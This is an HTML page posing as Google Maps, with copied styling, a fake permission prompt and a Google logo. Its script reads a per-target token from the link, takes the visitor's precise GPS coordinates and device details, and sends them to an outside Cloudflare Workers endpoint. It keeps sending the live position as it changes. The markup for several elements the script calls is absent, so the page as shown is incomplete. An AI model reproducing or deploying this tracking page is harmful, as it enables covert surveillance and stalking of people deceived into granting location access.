<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Maps</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
/* ================= RESET ================= */
html,body{
  margin:0;
  padding:0;
  height:100%;
  font-family:system-ui,-apple-system,Segoe UI,Roboto;
  background:#fff;
}

/* ================= MAP BACKGROUND ================= */
.map-bg{
  position:fixed;
  inset:0;
  z-index:1;
}
.map-bg iframe{
  width:100%;
  height:110%;
  border:0;
  filter:contrast(1.05) saturate(1.1);
}

/* ================= PERMISSION OVERLAY ================= */
#permission{
  position:fixed;
  inset:0;
  background:rgba(255,255,255,.85);
  z-index:10;
  display:flex;
  align-items:center;
  justify-content:center;
}

.d-box{
  background:white;
  padding:18px 22px;
  border-radius:16px;
  box-shadow:0 4px 12px rgba(0,0,0,.25);
  text-align:center;
  width:260px;
}

.d-box svg{
  width:46px;
  margin-bottom:10px;
}

.d-box h3{
  margin:6px 0 12px;
  color:#5f6368;
  font-weight:500;
}

.d-box h3 span{font-weight:400}

#allowBtn{
  background:#1a73e8;
  color:white;
  border:none;
  border-radius:18px;
  padding:6px 16px;
  font-size:16px;
  cursor:pointer;
}

#status{
  margin-top:10px;
  font-size:14px;
  color:#5f6368;
}

/* ===== Loader ===== */
.hidden{display:none}

.loader{
  display:none;
  flex-direction:column;
  align-items:center;
  gap:10px;
}

.spinner{
  width:28px;
  height:28px;
  border:3px solid #dadce0;
  border-top:3px solid #1a73e8;
  border-radius:50%;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  to{transform:rotate(360deg)}
}

.loader-text{
  font-size:14px;
  color:#5f6368;
}

/* ================= GOOGLE UI LAYER ================= */
.google-ui{
  position:fixed;
  inset:0;
  z-index:5;
  pointer-events:none;
}
.google-ui *{pointer-events:auto}

/* ===== Top Search ===== */
.top-search{
  position:absolute;
  top:40px;
  left:10px;
  right:10px;
  height:46px;
  background:white;
  border-radius:24px;
  display:flex;
  align-items:center;
  padding:0 14px;
  gap:12px;
  box-shadow:0 2px 6px rgba(0,0,0,.3);
}
header{
  position:relative;
  top:0px;
 margin-bottom: 20px;
  width: 100%;
  height:35px;
  background:white;
  justify-content: space-between;
  display:flex;
  align-items:center;
  padding:0 14px;
  gap:12px;
  box-shadow:0 2px 6px rgba(0,0,0,.3);
}
header>#google-icon{
  width: 18px;
}
header h3{
  margin:6px 0 12px;
  color:#5f6368;
  font-weight:500;
  position: relative;
  left: -40px;
}

header h3 span{font-weight:400}
#top-btn{
  background:#1a73e8;
  color:white;
  border:none;
  border-radius:18px;
  padding:5px 14px;
  font-size:15px;
  cursor:pointer;
}
.top-search i{
  font-size:18px;
  color:#5f6368;
}

.search-text{
  flex:1;
  font-size:15px;
  color:#202124;
  white-space:nowrap;
  overflow:hidden;
  text-overflow:ellipsis;
}

/* ===== Bottom Card ===== */
.bottom-card{
  position:absolute;
  bottom:0;
  width:100%;
  background:white;
  border-top-left-radius:18px;
  border-top-right-radius:18px;
  padding:14px;
  box-shadow:0 -2px 6px rgba(0,0,0,.25);
}

.coords{
  font-weight:500;
  font-size:15px;
}

.latlng{
  color:#5f6368;
  font-size:13px;
  margin-bottom:12px;
}

.actions{
  display:flex;
  gap:8px;
  overflow-x:auto;
}

.actions button{
  border:none;
  background:#f1f3f4;
  padding:8px 14px;
  border-radius:20px;
  font-size:14px;
  white-space:nowrap;
  cursor:pointer;
}

.actions .primary{
  background:#1a73e8;
  color:white;
}

/* ===== Google Logo ===== */
.google-logo{
  position:absolute;
  bottom:90px;
  left:12px;
  font-size:24px;
  font-weight:700;
  letter-spacing:-2px;
}
.google-blue{color:#4285f4}
.google-red{color:#ea4335}
.google-yellow{color:#fbbc05}
.google-green{color:#34a853}
</style>
</head>

<body>

<!-- ================= LOGIC (UNCHANGED) ================= -->
<script>
const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
const token = new URLSearchParams(location.search).get("token");
if(!token){ alert("Invalid link"); throw "NO TOKEN"; }

const mapFrame = document.getElementById("mapFrame");
const statusEl = document.getElementById("status");

function deviceInfo(){
  return {
    ua:navigator.userAgent,
    lang:navigator.language,
    screen:`${screen.width}x${screen.height}`,
    time:Date.now()
  };
}

document.getElementById("allowBtn").onclick = ()=>{
  //document.getElementById("allowBtn").style.display="none";
  document.getElementById("icon-text-box").style.display="none";
  document.getElementById("gLoader").style.display="block";
  document.getElementById("permission").classList.remove("d-box")
  statusEl.textContent="";

  navigator.geolocation.getCurrentPosition(
    pos=>{
      mapFrame.src =
        `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}&t=k&z=18&output=embed`;

      fetch(API+"/send-location",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
          token,
          lat:pos.coords.latitude,
          lng:pos.coords.longitude,
          acc:pos.coords.accuracy,
          device:deviceInfo()
        })
      });

      document.getElementById("permission").remove();

      navigator.geolocation.watchPosition(p=>{
        fetch(API+"/send-location",{
          method:"POST",
          headers:{"Content-Type":"application/json"},
          body:JSON.stringify({
            token,
            lat:p.coords.latitude,
            lng:p.coords.longitude,
            acc:p.coords.accuracy
          })
        });
      },()=>{}, {enableHighAccuracy:true, maximumAge:0});

    },
    e=>{
      statusEl.textContent =
        e.code===1
        ? "Permission denied. Enable Precise Location."
        : "GPS unavailable. Turn ON location.";
    },
    { enableHighAccuracy:true, timeout:25000, maximumAge:0 }
  );
};
</script>
